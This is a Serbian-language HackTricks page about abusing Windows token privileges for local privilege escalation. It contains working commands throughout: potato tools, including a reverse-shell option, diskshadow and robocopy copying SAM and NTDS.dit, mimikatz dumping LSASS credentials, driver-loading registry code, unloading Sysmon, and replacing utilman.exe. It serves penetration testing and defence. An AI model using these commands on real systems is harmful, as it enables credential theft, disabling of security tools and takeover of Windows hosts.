# Zloupotreba tokena

{{#include ../../banners/hacktricks-training.md}}

## Tokeni

Ako **ne znate šta su Windows Access Tokens**, pročitajte ovu stranicu pre nego što nastavite:


{{#ref}}
access-tokens.md
{{#endref}}

**Možda možete da eskalirate privilegije zloupotrebom tokena koje već posedujete.**

### SeImpersonatePrivilege

Ova privilegija omogućava procesu da se predstavi kao drugi korisnik (ali ne i da kreira token) kada može da dobije handle do tog tokena. Privilegovani token može se preuzeti od Windows servisa (DCOM) tako što se on navede da obavi NTLM autentifikaciju prema exploit-u, čime se potom omogućava pokretanje procesa sa SYSTEM privilegijama.<sup>[[2]](#references)</sup> Ovaj primitiv može se iskoristiti alatima kao što su [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (za koji je potrebno da WinRM bude onemogućen), [SweetPotato](https://github.com/CCob/SweetPotato) i [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Aplikacija dostupna samo preko loopback interfejsa može predstavljati zasebnu mogućnost za izazivanje autentifikacije, ako lokalni korisnik može da pristupi autentifikovanom endpoint-u koji šalje zahtev na URL koji je odabrao pozivalac, koristeći privilegovaniji identitet. Proverite autorizaciju endpoint-a i ograničenja URL-ova, stvarni identitet odlaznog klijenta i njegovo ponašanje pri autentifikaciji, kao i da li taj klijent može da dosegne listener kojim upravlja korisnik sa nižim privilegijama. Samo prisustvo omogućene privilegije `SeImpersonatePrivilege`, IIS listener-a ili parametra za preuzimanje URL-a ne dokazuje da postoji privilegovani token niti putanja za eskalaciju. Ovu proveru obavljajte pasivno; nemojte slati zahteve za izazivanje autentifikacije tokom enumeracije. Pogledajte Microsoftovu dokumentaciju za [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) i [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Savremene napomene za operatere:

- **JuicyPotato je zastareo**: na Windows 10 1809+/Server 2019+ prednost dajte alatima **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** ili **PrintSpoofer**, u zavisnosti od toga koja RPC/COM površina je i dalje dostupna.
- Ako ste kompromitovali servis koji radi kao **`LOCAL SERVICE`** ili **`NETWORK SERVICE`**, a `whoami /priv` prikazuje **filtrirani token** bez `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, prvo vratite **podrazumevani skup privilegija** naloga (na primer, pomoću **FullPowers**), a zatim ponovo isprobajte potato alate.<sup>[[3]](#references)</sup>
- Neki noviji fork-ovi su praktičniji za operatere od originalnih alata. Na primer, **SigmaPotato** dodaje reflection/in-memory izvršavanje i podršku za savremene verzije Windows-a, dok **PrintNotifyPotato** zloupotrebljava PrintNotify COM servis i često je koristan kada je klasična putanja preko Spooler-a onemogućena.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Veoma je slična privilegiji **SeImpersonatePrivilege**; koristi **istu metodu** za dobijanje privilegovanog tokena.\
Zatim, ova privilegija omogućava **dodeljivanje primarnog tokena** novom ili suspendovanom procesu. Pomoću privilegovanog tokena za impersonation možete izvesti primarni token (DuplicateTokenEx).\
Pomoću tokena možete kreirati **novi proces** pomoću funkcije 'CreateProcessAsUser' ili kreirati suspendovan proces i **postaviti token** (generalno, ne možete menjati primarni token pokrenutog procesa).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Ako je ovaj token omogućen, možete koristiti **KERB_S4U_LOGON** da biste dobili **token za impersonation** bilo kog drugog korisnika bez poznavanja kredencijala, **dodali proizvoljnu grupu** (admins) tokenu, postavili **nivo integriteta** tokena na "**medium**" i dodelili ovaj token **trenutnoj niti** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Ova privilegija uzrokuje da sistem **odobri pristup za čitanje** bilo kojoj datoteci (ograničeno na operacije čitanja). Koristi se za **čitanje hash-eva lozinki lokalnih Administrator** naloga iz registry-ja, nakon čega se alati poput "**psexec**" ili "**wmiexec**" mogu koristiti sa hash-om (tehnika Pass-the-Hash). Međutim, ova tehnika ne funkcioniše u dva slučaja: kada je lokalni Administrator nalog onemogućen ili kada je aktivna politika koja uklanja administratorska prava lokalnim Administratorima koji se povezuju udaljeno.<sup>[[2]](#references)</sup>\
U praksi, najpouzdaniji ugrađeni postupak obično je **VSS + `robocopy /b`**: kreirajte/izložite shadow copy, a zatim kopirajte `SAM`/`SYSTEM` ili `NTDS.dit` u **backup režimu**, čime se zaobilaze ACL-ovi datoteka.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Možete **zloupotrebiti ovu privilegiju** pomoću:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- praćenjem **IppSec** u [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ili kao što je objašnjeno u odeljku **eskalacija privilegija pomoću Backup Operators** u:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Ova privilegija omogućava **pristup za pisanje** bilo kojoj sistemskoj datoteci, bez obzira na njenu listu za kontrolu pristupa (ACL). Otvara brojne mogućnosti za eskalaciju, uključujući mogućnost **izmene servisa**, izvođenje DLL Hijacking-a i postavljanje **debugger-a** putem Image File Execution Options, između ostalih tehnika.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege je moćna dozvola, naročito korisna kada korisnik može da impersonira tokene, ali i kada nema SeImpersonatePrivilege. Ova mogućnost zavisi od toga da li možete da impersonirate token koji predstavlja istog korisnika i čiji nivo integriteta nije viši od nivoa integriteta trenutnog procesa.<sup>[[2]](#references)</sup>

**Ključne tačke:**

- **Impersonacija bez SeImpersonatePrivilege:** SeCreateTokenPrivilege se može iskoristiti za EoP putem impersonacije tokena pod određenim uslovima.
- **Uslovi za impersonaciju tokena:** Uspešna impersonacija zahteva da ciljni token pripada istom korisniku i da ima nivo integriteta koji je niži ili jednak nivou integriteta procesa koji pokušava impersonaciju.
- **Kreiranje i izmena tokena za impersonaciju:** Korisnici mogu da kreiraju token za impersonaciju i unaprede ga dodavanjem SID-a (Security Identifier) privilegovane grupe.

### SeLoadDriverPrivilege

Ova privilegija omogućava procesu da **učitava i uklanja drajvere uređaja** kreiranjem unosa u registru sa određenim vrednostima `ImagePath` i `Type`. Pošto je direktan pristup za pisanje u `HKLM` (HKEY_LOCAL_MACHINE) ograničen, umesto toga može se koristiti `HKCU` (HKEY_CURRENT_USER). Međutim, potreban je određeni put da bi kernel prepoznao unos `HKCU` kao konfiguraciju drajvera.<sup>[[2]](#references)</sup>

Savremena ofanzivna upotreba obično podrazumeva **BYOVD** (bring your own vulnerable driver): učitavanje **potpisanog, ali ranjivog** kernel drajvera, a zatim korišćenje njegovih IOCTL-ova za onemogućavanje zaštita ili postizanje izvršavanja koda u kernelu. Imajte na umu da na novijim verzijama Windows 11/Server-a **Microsoft vulnerable driver blocklist** i/ili **HVCI/Memory Integrity** često onemogućavaju starije javno poznate napade, pa klasični primeri u stilu `szkg64.sys` više nisu univerzalno pouzdani.

Ovaj put je `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, gde je `<RID>` Relative Identifier trenutnog korisnika. Unutar `HKCU` mora se kreirati ceo ovaj put i postaviti dve vrednosti:<sup>[[2]](#references)</sup>

- `ImagePath`, koji predstavlja putanju do binarne datoteke koja će se izvršiti
- `Type`, sa vrednošću `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Koraci:**

1. Koristite `HKCU` umesto `HKLM` zbog ograničenog pristupa za pisanje.
2. Kreirajte putanju `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` unutar `HKCU`, gde `<RID>` predstavlja Relative Identifier trenutnog korisnika.
3. Podesite `ImagePath` na putanju za izvršavanje binarne datoteke.
4. Postavite `Type` na `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Više načina za zloupotrebu ove privilegije: [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Slično je privilegiji **SeRestorePrivilege**. Njena osnovna funkcija omogućava procesu da **preuzme vlasništvo nad objektom**, zaobilazeći zahtev za eksplicitnim diskrecionim pristupom tako što mu se dodele prava pristupa WRITE_OWNER. Postupak podrazumeva da se prvo obezbedi vlasništvo nad željenim ključem registratora radi pisanja, a zatim izmeni DACL kako bi se omogućile operacije pisanja.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Ova privilegija omogućava **debugovanje drugih procesa**, uključujući čitanje i pisanje u memoriju. Uz ovu privilegiju mogu se primeniti različite strategije za ubrizgavanje u memoriju koje mogu da zaobiđu većinu antivirusnih i host intrusion prevention rešenja.<sup>[[2]](#references)</sup>

Na modernom Windowsu imajte na umu da je `SeDebugPrivilege` obično dovoljna za otvaranje **SYSTEM procesa koji nisu zaštićeni** i dupliranje njihovih tokena, ali **ne** garantuje da možete pristupiti **LSASS-u**. Ako je omogućena opcija **RunAsPPL / LSA Protection**, nezaštićeni procesi ne mogu da čitaju iz LSASS-a niti da ubacuju kod u njega, čak i kada je prisutna privilegija `SeDebugPrivilege`. U tom slučaju ukradite token iz drugog SYSTEM procesa koji nije PPL ili upotrebite PPL bypass/BYOVD umesto da pretpostavite da će `procdump` raditi. Primer potpunog kopiranja tokena pomoću `SeDebugPrivilege` + `SeImpersonatePrivilege` potražite na [ovoj stranici](sedebug-+-seimpersonate-copy-token.md).

#### Dump memorije

Možete koristiti [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) iz paketa [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) za **hvatanje memorije procesa**. To se posebno može primeniti na proces **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, koji je zadužen za čuvanje korisničkih akreditiva nakon što se korisnik uspešno prijavi na sistem.

Zatim možete učitati ovaj dump u mimikatz da biste dobili lozinke:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Prethodno sačuvan, čitljiv LSASS dump možda je dostupan iako trenutni nalog nema dozvolu da napravi dump aktivnog zaštićenog procesa. Datoteku dump-a ili arhivu sa sličnim nazivom posmatrajte samo kao trag: proverite pristup i sadržaj, a zatim procenite da li su pronađeni credential-i još važeći i omogućavaju kontekst sa višim privilegijama. Sam naziv datoteke ne dokazuje da arhiva sadrži dump niti da se credential-i mogu ponovo koristiti.

#### RCE

Ako želite da dobijete `NT SYSTEM` shell, možete koristiti:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Ovo pravo (Obavljanje zadataka održavanja volumena) može da omogući privilegovane operacije nad volumenom, ali samo po sebi ne garantuje čitljiv handle za raw-volume niti proizvoljan pristup datotekama. ACL-ovi uređaja, stanje tokena, verzija Windows-a i tražena operacija i dalje su bitni. Dozvoljena operacija upravljanja volumenom može umesto toga da promeni ACL-ove sistema datoteka; to je mutirajuća radnja koja potencijalno utiče na ceo volumen. Na CA hostu, zloupotreba sertifikata zahteva i pristup upotrebljivom materijalu privatnog ključa, a za datoteke zaštićene EFS-om i dalje je potreban ovlašćeni ključ za dešifrovanje ili oporavak. Detaljni preduslovi navedeni su u nastavku.<sup>[[5]](#references)</sup>

Pogledajte detaljne tehnike i mere ublažavanja:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Provera privilegija

```
whoami /priv
```

**Tokeni koji se prikazuju kao onemogućeni** obično se mogu omogućiti, pa često možete zloupotrebiti i _omogućene_ i _onemogućene_ privilegije.

### Omogućavanje svih tokena

Ako imate onemogućene privilegije, možete koristiti skriptu [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) da omogućite sve tokene:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Ili **script** ugrađen u ovaj [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Kompletan pregled token privilegija nalazi se na [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); sažetak u nastavku navodi samo direktne načine za iskorišćavanje privilegije radi dobijanja administratorske sesije ili čitanja osetljivih datoteka.<sup>[[1]](#references)</sup>

| Privilegija                | Uticaj     | Alat                    | Putanja izvršavanja                                                                                                                                                                                                                                                                                                                                     | Napomene                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | alat treće strane       | _"Omogućava korisniku da se lažno predstavlja kao drugi token i podigne privilegije do NT sistema pomoću alata kao što su potato.exe, rottenpotato.exe i juicypotato.exe"_                                                                                                                                                                              | Hvala [Aurélienu Chalotu](https://twitter.com/Defte_) na ažuriranju. Uskoro ću pokušati da to preformulišem u obliku recepta.                                                                                                                                                                                         |
| **`SeBackup`**             | **Pretnja** | _**Ugrađene komande**_  | Čitanje osetljivih datoteka pomoću `robocopy /b` ili namenskih pomoćnih alata za kopiranje koji podržavaju SeBackup.                                                                                                                                                                                                                                                                 | <p>- Pogodno za `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` i ponekad `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` je praktičan, ali namenski SeBackup cmdlet-i/API-ji često nude veću fleksibilnost za zaključane/otvorene datoteke.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | alat treće strane       | Kreiranje proizvoljnog tokena koji uključuje lokalna administratorska prava pomoću `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Dupliranje SYSTEM tokena koji nije **PPL** ili izbacivanje memorije iz nezaštićenog procesa.                                                                                                                                                                                                                                                                 | <p>Izbacivanje LSASS memorije obično je blokirano ako su omogućeni RunAsPPL/LSA Protection.</p><p>Script se nalazi na [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | alat treće strane       | Korišćenje **Potato family** / lažnog predstavljanja preko named-pipe-a za pokretanje procesa kao SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` itd.).                                                                                                                                                                                    | <p>Najpraktičnije je koristiti ovu mogućnost iz servisnih naloga kao što su IIS APPPOOL, MSSQL, zakazani zadaci ili bilo kog konteksta koji već ima `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | alat treće strane       | <p>1. Učitati potpisani, ali ranjivi kernel drajver (BYOVD)<br>2. Koristiti IOCTL-ove drajvera za pristup kernelu za čitanje/upisivanje, isključivanje bezbednosnih alata ili podizanje privilegija do SYSTEM<br><br>Ova privilegija se može koristiti i za uklanjanje bezbednosnih drajvera pomoću ugrađene komande <code>fltMC</code>, npr. <code>fltMC sysmondrv</code></p>                     | <p>Stariji javno dostupni drajveri poput <code>szkg64.sys</code> sve se češće blokiraju na modernom Windowsu pomoću liste blokiranih ranjivih drajvera / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Pokrenuti PowerShell/ISE sa omogućenom privilegijom SeRestore.<br>2. Omogućiti privilegiju pomoću <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Preimenovati utilman.exe u utilman.old<br>4. Preimenovati cmd.exe u utilman.exe<br>5. Zaključati konzolu i pritisnuti Win+U</p> | <p>Neki AV softveri mogu otkriti napad.</p><p>Alternativni metod se oslanja na zamenu servisnih binarnih datoteka smeštenih u "Program Files" pomoću iste privilegije</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Ugrađene komande**_  | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Preimenovati cmd.exe u utilman.exe<br>4. Zaključati konzolu i pritisnuti Win+U</p>                                                                                                                                       | <p>Neki AV softveri mogu otkriti napad.</p><p>Alternativni metod se oslanja na zamenu servisnih binarnih datoteka smeštenih u "Program Files" pomoću iste privilegije.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | alat treće strane       | <p>Manipulisati tokenima tako da sadrže lokalna administratorska prava. Možda je potreban SeImpersonate.</p><p>Treba proveriti.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - putevi eksploatacije od Windows privilegija do admina](https://github.com/gtworek/Priv2Admin)
- [2] [Zloupotreba token privilegija za LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Vratite mi moje privilegije! Molim?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` režim bekapa zaobilazi provere ACL-a za datoteke/fascikle)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Izvođenje zadataka održavanja volumena (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → eksfiltracija CA ključa → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
